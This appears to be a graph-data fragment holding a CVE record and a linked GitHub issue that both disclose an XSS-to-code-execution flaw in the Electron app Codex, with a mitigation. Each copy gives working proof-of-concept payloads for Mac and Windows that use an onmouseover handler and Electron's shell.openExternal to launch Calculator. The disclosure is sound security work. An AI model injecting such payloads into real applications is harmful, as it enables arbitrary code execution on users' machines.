    <node id="CVE-2021-43635">
      <data key="d0">CVE</data>
      <data key="d1">javascript</data>
      <data key="d2">Code Execution vulnerability on Codex</data>
      <data key="d3">### Issue
Cross-site scripting(XSS) on Codex Notebook/Page name lead to code execution.

### Reproduction
1. Open Codex
2. Create new Notebook
3. Insert payload on the Notebook(or page) name field
On Mac
`&lt;a href=x onmouseover="require('electron').shell.openExternal('file:///System/Applications/Calculator.app')"&gt;test&lt;/a&gt;`
On Windows
`&lt;a href=x onmouseover="require('electron').shell.openExternal('C:/Windows/System32/calc.exe')"&gt;test&lt;/a&gt;`
4. Once you move your mouse over the link "test" , Calculator will be opened. 

&lt;img width="949" alt="截圖 2021-09-10 下午4 59 27" src="https://user-images.githubusercontent.com/64322368/132828807-4742e2b6-c748-4ca1-8823-a6f484129d7f.png"&gt;

### Mitigation
Disable nodeIntegration
</data>
    </node>
    <node id="jcv8000/Codex#8">
      <data key="d0">Issue</data>
      <data key="d2">Code Execution vulnerability on Codex</data>
      <data key="d3">### Issue
Cross-site scripting(XSS) on Codex Notebook/Page name lead to code execution.

### Reproduction
1. Open Codex
2. Create new Notebook
3. Insert payload on the Notebook(or page) name field
On Mac
`&lt;a href=x onmouseover="require('electron').shell.openExternal('file:///System/Applications/Calculator.app')"&gt;test&lt;/a&gt;`
On Windows
`&lt;a href=x onmouseover="require('electron').shell.openExternal('C:/Windows/System32/calc.exe')"&gt;test&lt;/a&gt;`
4. Once you move your mouse over the link "test" , Calculator will be opened. 

&lt;img width="949" alt="截圖 2021-09-10 下午4 59 27" src="https://user-images.githubusercontent.com/64322368/132828807-4742e2b6-c748-4ca1-8823-a6f484129d7f.png"&gt;

### Mitigation
Disable nodeIntegration
</data>
